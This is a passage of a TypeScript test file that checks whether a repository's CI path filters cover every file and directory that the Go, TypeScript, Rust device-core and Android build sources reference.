  for (const [check, list] of Object.entries({ go: CHECK_PATHS.go!, typescript: CHECK_PATHS.typescript!, browser: BROWSER_PATHS, circuits: CIRCUITS_PATHS })) {
    assert.deepEqual(
      packages.filter((p) => !matchesPaths(list, p)),
      [],
      check,
    );
  }
});

test("the typescript check runs when anything it uses changes: every file and directory the sources of protocol/, worker/ and web/ name is in its list", () => {
  const list = CHECK_PATHS.typescript!;
  const { paths, goPackages } = namedByTypeScript(trackedFiles("protocol", "worker", "web"));
  for (const p of ["protocol", "spec/vectors", "design/copy", "crl/testdata", "web/README.md", "crl/README.md", "android/gradle/wrapper", "ios/Tests", ".github/workflows", "circuits"]) assert.ok(paths.has(p), `the check found ${p}: ${[...paths].join(", ")}`);
  assert.ok(goPackages.has("./verifier") && goPackages.has("./cmd/iamreal-crl") && goPackages.has("./prooflog"), `the check read the Go commands: ${[...goPackages].join(", ")}`);
  assert.deepEqual(
    [...paths].filter((p) => !holds(list, p)),
    [],
  );
});

test("a path the sources name that is on disk but not tracked (.env.local, an output directory) is not counted as one the checks use", () => {
  mkdirSync(join(WORKER_DIR, "test-output"), { recursive: true });
  const dir = mkdtempSync(join(WORKER_DIR, "test-output", "untracked-"));
  try {
    const name = relative(REPO, dir).split(sep).join("/");
    writeFileSync(join(dir, "secret.txt"), "not tracked\n");
    writeFileSync(join(dir, "names.ts"), `join(REPO, "${name}", "secret.txt");\njoin(REPO, "${name}");\njoin(REPO, "worker", "package.json");\n`);
    const { paths } = namedByTypeScript([`${name}/names.ts`]);
    assert.deepEqual([...paths], ["worker/package.json"]);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test(
  "the typescript check runs when the Go programs its tests build, test and run change: their packages' directories, and what those sources name, are in its list",
  skipWithoutGo("the Go packages the tests of worker/ and web/ use are not looked at"),
  () => {
    assert.ok(hasGo, "go is not installed, and CI or IAMREAL_BB is set: this check must run here");
    const list = CHECK_PATHS.typescript!;
    const { goPackages } = namedByTypeScript(trackedFiles("protocol", "worker", "web"));
    const dirs = goDirectories([...goPackages]);
    for (const d of ["verifier", "cmd/iamreal-verify", "cmd/iamreal-crl", "crl", "prooflog"]) assert.ok(dirs.includes(d), `the check found ${d}`);
    const named = namedByGo(trackedFiles(...dirs).filter((f) => dirs.includes(dirname(f))));
    assert.ok(named.has("spec/vectors"), `the check read the Go sources: ${[...named].join(", ")}`);
    assert.deepEqual(
      ["go.mod", "go.sum", ...dirs, ...named].filter((p) => !holds(list, p)),
      [],
    );
  },
);

/**
 * The files and directories of the repository that device-core/'s sources
 * name: in the Rust, `repo_file("<path>")` and
 * `repo_file(&format!("<path>{...}"))` (a path from the root, up to the
 * first `{`), `vectors("<name>")` (spec/vectors/), `.join("../...")` from
 * the crate's directory (CARGO_MANIFEST_DIR) and `include_str!`,
 * `include_bytes!` from the file's; in a Cargo.toml, `path = "..."`.
 * Not seen: a path put together any other way, what a build script or a
 * macro of a dependency reads, and what the two fetch scripts download
 * (they check a SHA-256 kept in device-core/).
 */
function namedByDeviceCore(): Set<string> {
  const paths = new Set<string>();
  const add = (path: string): void => {
    const found = inRepo(path) ?? inRepo(dirname(path));
    if (found !== undefined) paths.add(found);
  };
  for (const f of trackedFiles("device-core")) {
    const file = join(REPO, f);
    if (f.endsWith("Cargo.toml")) for (const m of readFileSync(file, "utf8").matchAll(/\bpath\s*=\s*"([^"]+)"/g)) add(resolve(dirname(file), m[1]!));
    if (!f.endsWith(".rs")) continue;
    const text = readFileSync(file, "utf8");
    let crate = dirname(file);
    while (!existsSync(join(crate, "Cargo.toml"))) crate = dirname(crate);
    for (const m of text.matchAll(/\brepo_file\(\s*(?:&format!\(\s*)?"([^"{]+)/g)) add(join(REPO, m[1]!));
    for (const m of text.matchAll(/\bvectors\(\s*"([^"{]+)/g)) add(join(REPO, "spec", "vectors", m[1]!));
    for (const m of text.matchAll(/\.join\(\s*"((?:\.\.\/?)+[^"]*)"/g)) {
      const found = inRepo(resolve(crate, m[1]!));
      if (found !== undefined) paths.add(found);
    }
    for (const m of text.matchAll(/\binclude_(?:str|bytes)!\(\s*"([^"]+)"/g)) add(resolve(dirname(file), m[1]!));
  }
  return paths;
}

test("the device-core check runs when anything it uses changes: every file and directory its sources name is in its list", () => {
  const list = CHECK_PATHS["device-core"]!;
  const named = namedByDeviceCore();
  for (const p of ["spec/vectors", "spec/record-rules.md", "crl/testdata", "web/circuits", "verifier/vk", "device-core/checks", "device-core/include"]) {
    assert.ok([...named].some((x) => x === p || x.startsWith(`${p}/`)), `the check found ${p}: ${[...named].join(", ")}`);
  }
  assert.deepEqual(
    [...named].filter((p) => !holds(list, p)),
    [],
  );
  assert.ok(list.includes("device-core/**"));
});

test("the android check runs when anything it uses changes: every file and directory its Gradle scripts and build-native.sh name is in its list, with all of android/ and device-core/", () => {
  // Found by reading android/'s Gradle scripts (`rootProject.file("<path>")`, from android/, and
  // `core.resolve("<path>")`, from device-core/) and shell scripts (`$here/<path>`, from the
  // script's directory, and `$core/<path>`, from device-core/). A path put together any other way,
  // and what the Android Gradle plugin reads by convention (all of it under android/), is not seen.
  const list = CHECK_PATHS.android!;
  const named = new Set<string>();
  const add = (path: string): void => {
    const found = inRepo(path);
    if (found !== undefined) named.add(found);
  };
  const android = join(REPO, "android");
  const core = join(REPO, "device-core");
  for (const f of trackedFiles("android")) {
    if (!/\.(kts|sh)$/.test(f)) continue;
    const file = join(REPO, f);
    const text = readFileSync(file, "utf8");
    for (const m of text.matchAll(/rootProject\.file\(\s*"([^"]+)"/g)) add(resolve(android, m[1]!));
    for (const m of text.matchAll(/\bcore\.resolve\(\s*"([^"]+)"/g)) add(resolve(core, m[1]!));
    for (const m of text.matchAll(/\$here\/([A-Za-z0-9_./-]+)/g)) add(resolve(dirname(file), m[1]!));
    for (const m of text.matchAll(/\$core\/([A-Za-z0-9_./-]+)/g)) add(resolve(core, m[1]!));
  }
  for (const p of ["device-core", "device-core/Cargo.lock", "device-core/fetch-barretenberg.sh", "web/circuits", "verifier/vk", "spec/vectors", "design/copy/app.md", "android/jni", "android/bundled.sha256"]) assert.ok(named.has(p), `the check found ${p}: ${[...named].join(", ")}`);
  assert.deepEqual(
    [...named].filter((p) => !holds(list, p)),
    [],
  );
  // The app links device-core/ and bundles the files its proofs need: the whole of each.
  for (const p of ["android/**", "device-core/**", "web/circuits/**", "verifier/vk/**"]) assert.ok(list.includes(p), p);
});
